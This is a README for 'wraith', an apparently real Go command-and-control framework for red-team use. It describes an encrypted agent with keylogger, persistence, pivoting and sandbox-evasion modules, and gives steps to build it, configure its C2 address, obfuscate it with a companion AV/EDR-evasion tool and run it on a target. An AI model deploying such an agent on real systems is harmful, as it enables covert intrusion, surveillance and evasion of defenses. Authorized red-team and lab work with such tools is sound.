<div align="center">

# 👻 wraith

**Professional Command & Control Framework**

![Build](https://img.shields.io/github/actions/workflow/status/Kronoscba/wraith/ci.yml?branch=main&style=flat-square&logo=github)
![License](https://img.shields.io/github/license/Kronoscba/wraith?style=flat-square)
![Go](https://img.shields.io/badge/go-1.25%2B-00ADD8?style=flat-square&logo=go)
![Version](https://img.shields.io/badge/version-1.0.0-blue?style=flat-square)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey?style=flat-square)

> ⚠️ **For authorized environments only — CTF, Red Team labs, Bug Bounty.
> Ethical use only.**

</div>

---

## 📖 Overview

**wraith** is a professional, full-featured Command & Control framework written
in Go.\
Designed for red team operators who need a reliable, encrypted, and modular
post-exploitation platform — not just another PoC.

Built to integrate natively with
**[shroud](https://github.com/Kronoscba/shroud)** for payload obfuscation before
deployment.

---

## ✨ Features

| Feature                          | Description                                           |
| -------------------------------- | ----------------------------------------------------- |
| 🌐 **Multi-Protocol**            | TCP, HTTP, HTTPS and DNS listeners                    |
| 🔒 **AES-256-GCM**               | All agent ↔ server comms fully encrypted              |
| 🖥️ **Cross-Platform Agent**      | Linux, Windows, macOS (x86/x64)                       |
| 💉 **Post-Exploitation Modules** | Shell, Upload, Download, Screenshot, Keylogger, Pivot |
| 🔄 **Persistence**               | crontab (Linux), Registry (Windows), launchd (macOS)  |
| 🕵️ **Sandbox Detection**         | VM/sandbox detection with auto-destruction            |
| 🧬 **shroud Integration**        | Payload obfuscation pre-deployment                    |
| 🖥️ **Web Dashboard**             | Real-time operator UI via REST API                    |
| 🗄️ **SQLite Logging**            | Full operation logging — agents, tasks, results       |
| ⚡ **Zero runtime bloat**        | Pure Go stdlib — minimal dependencies                 |

---

## 🏗️ Architecture

```
wraith/
├── cmd/
│   ├── server/          # Server entry point
│   └── agent/           # Agent entry point
├── server/
│   ├── listener/        # TCP / HTTP / HTTPS / DNS listeners
│   ├── handler/         # Agent & task management
│   ├── api/             # REST API
│   ├── crypto/          # TLS + AES-256-GCM
│   ├── db/              # SQLite persistence
│   └── logger/          # Operation logging
├── agent/
│   ├── comms/           # Communication channels
│   ├── modules/         # Post-exploitation modules
│   ├── evasion/         # Sandbox detection + shroud integration
│   └── crypto/          # Agent-side AES-256-GCM
└── dashboard/           # Web UI
```

---

## 🚀 Installation

```bash
git clone https://github.com/Kronoscba/wraith.git
cd wraith
go build ./...
```

### Build agent for specific platform

```bash
# Linux x64
GOOS=linux GOARCH=amd64 go build -o wraith-agent ./cmd/agent

# Windows x64
GOOS=windows GOARCH=amd64 go build -o wraith-agent.exe ./cmd/agent

# macOS x64
GOOS=darwin GOARCH=amd64 go build -o wraith-agent-macos ./cmd/agent
```

---

## 🛠️ Usage

### Start the server

```bash
./cmd/server/server
# Or with custom config:
cp server/config/config.json.example config.json
./cmd/server/server
```

### Configure the agent

Edit `agent/config.go` or set environment variables:

```
C2_ADDR=192.168.1.10:8080
SHARED_KEY=your-32-byte-key-here!!
INTERVAL=5
```

### Deploy the agent

```bash
# Optional: obfuscate with shroud first
shroud -i wraith-agent -o wraith-agent-obf -e aes -k "your-32-byte-key-here!!"

# Run on target (authorized lab only)
./wraith-agent
```

### Web Dashboard

```
http://localhost:8000
```

---

## 📡 Protocols

| Protocol | Default Port | Use Case                            |
| -------- | ------------ | ----------------------------------- |
| TCP      | 8080         | Fast, reliable comms                |
| HTTP     | 80           | Blends with web traffic             |
| HTTPS    | 443          | Encrypted + blends with web traffic |
| DNS      | 53           | Bypasses most firewalls             |

---

## 🧪 Testing

```bash
go test ./...
```

```
ok  github.com/Kronoscba/wraith/tests  1.010s
```

---

## 🔧 CI/CD

Automated pipeline on every push/PR to `main`:

1. `go fmt ./...`
2. `go vet ./...`
3. `go build ./...`
4. `go test ./...`
5. Cross-compile check: Linux / Windows / macOS

---

## 🔗 Integrations

| Tool                                          | Purpose                                                    |
| --------------------------------------------- | ---------------------------------------------------------- |
| [shroud](https://github.com/Kronoscba/shroud) | AV/EDR evasion — obfuscate agent payload before deployment |

---

## ⚖️ Legal & Ethics

This tool is intended **exclusively** for:

- Capture The Flag (CTF) competitions
- Authorized Red Team engagements
- Security research in controlled lab environments
- Bug Bounty programs within scope

**Unauthorized use against systems you do not own or have explicit permission to
test is illegal.**\
The author assumes no responsibility for misuse.

---

## 👤 Author

**Gabriel** — Offensive Security / Red Team\
[![GitHub](https://img.shields.io/badge/GitHub-Kronoscba-black?style=flat-square&logo=github)](https://github.com/Kronoscba)\
[![shroud](https://img.shields.io/badge/also-shroud-darkred?style=flat-square)](https://github.com/Kronoscba/shroud)

---

<div align="center">
<sub>Built with Go 🐹 | Designed for the field</sub>
</div>

